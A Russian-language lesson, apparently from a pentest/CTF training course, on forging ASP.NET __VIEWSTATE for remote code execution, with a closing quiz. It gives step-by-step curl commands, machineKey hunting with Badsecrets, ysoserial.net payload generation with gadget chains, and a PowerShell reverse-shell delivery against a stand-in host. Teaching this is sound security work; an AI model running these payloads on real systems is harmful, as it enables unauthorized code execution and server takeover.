---
id: web-viewstate
title: ".NET ViewState deserialization (machineKey, __VIEWSTATE)"
category: web
parent: web-deser-expert
difficulty: expert
order: 2
tags: [dotnet, viewstate, deserialization, machinekey, ysoserial, rce]
prerequisites: [web-deserialization]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 45
summary: "ASP.NET ViewState: machineKey, подделка и RCE через ysoserial.net, ViewStateUserKey и обход MAC."
---

## Вопрос, с которого всё начинается

Java-десериализацию мы разобрали. У ASP.NET (веб-фреймворк Microsoft) есть похожая механика, но спрятанная на виду: почти каждая форма несёт в себе скрытое поле `__VIEWSTATE` — сериализованное состояние страницы, которое клиент возвращает серверу. Оно подписано ключом `machineKey`, чтобы его нельзя было подменить.

Вопрос: что, если ключ утёк, предсказуем или проверка подписи отключена? Тогда мы подделаем `__VIEWSTATE` с **gadget-цепочкой** и получим RCE. Разберём на одном примере.

## Наш пример

Есть корпоративное ASP.NET-приложение `intranet.example`. Открываем страницу и находим скрытое поле:

```bash
$ curl -s https://intranet.example/Default.aspx | grep -o '__VIEWSTATE[^"]*' | head -c 120
__VIEWSTATE=/wEPDwUKMTI3NDk4NTY3OWRk...
```

`/wEP...` — base64 от потока `ObjectStateFormatter` (это встроенный сериализатор ASP.NET). Декодируем начало:

```bash
$ echo '/wEPDwUKMTI3NDk4NTY3OWRk' | base64 -d | xxd | head -1
00000000: ff01 1f02 0000 0000 0000 0000 0000 0000  ................
```

`ff 01 1f` — маркер формата. Внутри — сериализованный граф объектов. Целостность защищена **MAC** (кодом аутентичности сообщения) на ключе `machineKey`. Первый вопрос, который надо решить: **проверяется ли эта подпись?**

## Шаг 1: проверяем, включён ли MAC

Самый быстрый тест — испортить ViewState и посмотреть на реакцию сервера:

```bash
# 1) берём оригинал
$ curl -s https://intranet.example/Default.aspx | grep -o '__VIEWSTATE[^"]*' | head -1
# 2) меняем последний символ и отправляем
$ curl -s -X POST https://intranet.example/Default.aspx \
  --data-urlencode '__VIEWSTATE=/wEPDwUKMTI3NDk4NTY3OWRkZZZ' | grep -i MAC
```

Если сервер ответил ошибкой `Validation of viewstate MAC failed` — подпись проверяется, и нам нужен ключ. Если ошибки нет — MAC отключён (`EnableViewStateMac="false"`), и payload можно сгенерировать **без ключа**. В старых .NET (до патчей MS12-066/MS13-053) существовал даже обход проверки MAC без ключа — на непропатченных системах он работал.

## Шаг 2: ищем `machineKey`

Если MAC включён, ищем ключ `machineKey` в конфиге приложения `web.config`:

```xml
<machineKey validationKey="..." decryptionKey="..." validation="HMACSHA256" decryption="AES"/>
```

Где он утекает:

- **исходники:** `.git`, backup-архивы, LFI (см. `web-git-env-exposure`);
- **дефолтные ключи** из документации, туториалов, старых шаблонов — их знает инструмент `Badsecrets`;
- **verbose error pages**, иногда раскрывающие конфигурацию;
- **общие конфиги:** приложения, развёрнутые из одного шаблона, делят ключ.

```bash
$ python3 -m badsecrets --url https://intranet.example/Default.aspx
[+] Known Secret: ...   # можно подписывать ViewState
```

## Шаг 3: генерируем payload

Инструмент `ysoserial.net` (аналог `ysoserial` для .NET) собирает ViewState с gadget-цепочкой. Если ключ известен:

```bash
$ ysoserial.exe -p ViewState -g TypeConfuseDelegate \
  -c "cmd /c whoami" \
  --path="/Default.aspx" --apppath="/" \
  --validationkey="<hex>" --validationalg="SHA1" \
  --decryptionkey="<hex>" --decryptionalg="AES"
```

Если MAC отключён — без ключей, с флагом `--islegacy` для старых форматов:

```bash
$ ysoserial.exe -p ViewState -g TypeConfuseDelegate \
  -c "cmd /c whoami" --path="/Default.aspx" --apppath="/" --islegacy
```

Выбор gadget зависит от версии .NET:

| Gadget | Условие |
|--------|---------|
| `TypeConfuseDelegate` | .NET 4.x, надёжный, часто работает |
| `TextFormattingRunProperties` | .NET 4.x, популярен |
| `ActivitySurrogateDisableTypeCheck` | современный .NET, обходит проверки типов |
| `WindowsIdentity` | вызов через делегаты |
| `ObjectDataProvider` | WPF, зависит от сборок |

## Шаг 4: доставляем и подтверждаем

Отправляем payload как `__VIEWSTATE`:

```bash
$ PAYLOAD=$(ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "cmd /c whoami" \
    --path="/Default.aspx" --apppath="/" --islegacy | tail -1)
$ curl -s -X POST https://intranet.example/Default.aspx \
  --data-urlencode "__VIEWSTATE=$PAYLOAD"
```

Вывод команды в ответ не попадает — сервер десериализует и выполняет «в стороне». Поэтому доказательство строится через **OOB** или reverse shell:

```bash
$ ysoserial.exe -p ViewState -g TextFormattingRunProperties \
  -c "cmd /c powershell -e <base64-revshell>" --path="/Default.aspx" --apppath="/"
```

Пришёл обратный шелл — RCE подтверждён. Обязательно сделай **read-back** (`whoami` в шелле), прежде чем считать находку подтверждённой.

## Шаг 5: соседние поля

`__VIEWSTATE` — не единственное поле. Рядом могут быть:

- **`__VIEWSTATEGENERATOR`** — идентификатор генератора; иногда нужен для валидной генерации.
- **`__EVENTVALIDATION`** — отдельный MAC-защищённый блок для валидации событий; иногда нужно подписать и его.
- **`__VIEWSTATEENCRYPTED`** — маркер, что ViewState зашифрован; тогда нужен `decryptionKey`.

Разбирать существующее значение удобно `ViewStateDecoder` — он печатает дерево объектов и помогает понять формат.

## Шаг 6: когда ViewState не вектор

Если видишь свежую версию .NET, включённый MAC и уникальный (не дефолтный) `machineKey` — ViewState, скорее всего, закрыт. Не записывай «безопасно» сгоряча: переходи к другим .NET-векторам — десериализация через `BinaryFormatter` в других полях, `__EVENTVALIDATION`, JSON-десериализаторы. Методология та же: детект → инвентаризация ключей/классов → gadget → доставка → OOB.

Отдельно стоит помнить, что ViewState — это не «одно поле», а целое семейство. Кроме `__VIEWSTATE` в форме могут быть `__VIEWSTATEENCRYPTED` (маркер шифрования), `__EVENTTARGET`, `__EVENTARGUMENT` и `__EVENTVALIDATION`. Последнее тоже защищено MAC и иногда содержит сериализованные данные, которые можно подделать при известном ключе. Поэтому, найдя утечку `machineKey`, проверь все скрытые поля страницы, а не только главный blob. Разбор страницы целиком (`grep -o '__[A-Z]*'` по HTML) покажет полный список кандидатов.

## Шаг 7: где искать утечку ключа в реальном тесте

Чаще всего `machineKey` приходит из утёкших исходников. Порядок действий: проверь открытый `.git` (см. `web-git-env-exposure`), бэкапы (`web.config.bak`, `site.zip`), LFI-точки, а затем прогони `Badsecrets` на дефолтные ключи. Если приложение развёрнуто из публичного шаблона (старый шаблон форума, CMS-дистрибутив), ключ может быть **одинаковым у тысяч установок** — именно такие ключи и держит в базе `Badsecrets`. Нашёл ключ — генерируй ViewState с ним и проверяй read-back'ом.

## Что мы теперь знаем

- `__VIEWSTATE` — сериализованное состояние ASP.NET-страницы (`ObjectStateFormatter`), подписанное `machineKey`.
- Первый тест — испортить ViewState и посмотреть, ругается ли сервер на MAC.
- MAC отключён → payload без ключа; MAC включён → нужен `machineKey`.
- Ключ ищут в `web.config` (утечки/.git/backup), дефолтах (`Badsecrets`).
- `ysoserial.net` генерирует ViewState с gadget-цепочкой; выбор gadget зависит от версии .NET.
- Рядом — `__EVENTVALIDATION` и `__VIEWSTATEGENERATOR`; иногда нужны и они.
- Артефакт — reverse shell/read-back, а не «ошибка 500».

## На что смотреть дальше

- **Сначала проверь MAC** — это определяет, нужен ли ключ.
- **Не путай с Java-десериализацией:** здесь .NET `ObjectStateFormatter`, инструмент `ysoserial.net`.
- **Версия .NET** определяет доступные gadget'ы.
- **`__EVENTVALIDATION`** иногда тоже подписывается — не забудь.
- **Ключ может быть дефолтным** — прогони `Badsecrets` перед выводом «ключ неизвестен».
- **Проверяй все скрытые поля страницы**, а не только `__VIEWSTATE`: `__EVENTVALIDATION` тоже подписано MAC и иногда содержит сериализованные данные.
- **Только с согласия.** RCE меняет состояние прода.

## Квиз

Проверь себя.

```quiz
- question: "Что хранится в `__VIEWSTATE`?"
  options:
    - "Пароль пользователя"
    - "Сериализованное состояние ASP.NET-страницы"
    - "TLS-ключ"
    - "Cookie сессии"
  answer: 1
  explanation: "Это состояние WebForms-страницы в формате ObjectStateFormatter."
- question: "Как быстро понять, проверяется ли MAC?"
  options:
    - "Спросить у сервера версию"
    - "Испортить ViewState и посмотреть, ругается ли сервер на `Validation of viewstate MAC failed`"
    - "Отправить SQL"
    - "Сменить браузер"
  answer: 1
  explanation: "Реакция на порчу значения показывает, включена ли проверка подписи."
- question: "Что нужно, чтобы подделать ViewState при включённом MAC?"
  options:
    - "Только URL"
    - "`machineKey` (validation/decryption)"
    - "SQL-инъекция"
    - "Cookie"
  answer: 1
  explanation: "Подпись проверяется ключом, поэтому нужен ключ (утёкший или дефолтный)."
- question: 'Что означает `EnableViewStateMac="false"`?'
  options:
    - "Шифрование"
    - "MAC не проверяется — можно подделать ViewState без ключа"
    - "Сжатие"
    - "Кеширование"
  answer: 1
  explanation: "Отключённая проверка подписи позволяет генерировать payload без ключа."
- question: "Где искать `machineKey`?"
  options:
    - "В HTML-разметке"
    - "В `web.config` (утечки/бэкапы/.git) или в дефолтах"
    - "В DNS-записях"
    - "В TLS-сертификате"
  answer: 1
  explanation: "Конфиг приложения или известные дефолтные значения."
```

## Куда дальше

Дальше мы разберём ещё одну PHP-технику, где RCE достигается **без десериализации объектов** — через обёртки и трюки файловых функций (`web-php-tricks`). А пока главное запомни: `__VIEWSTATE` — это сериализованный blob; если подпись не проверяется или ключ известен, он подделывается до RCE.

## Где пригодится

- **CTF (Web):** задачи на ASP.NET.
- **Bug bounty:** ViewState RCE — критичный отчёт.
- **Пентест:** аудит enterprise ASP.NET.
- **Работа (AppSec):** уникальный machineKey, включённый MAC, ротация ключей, обновление .NET.
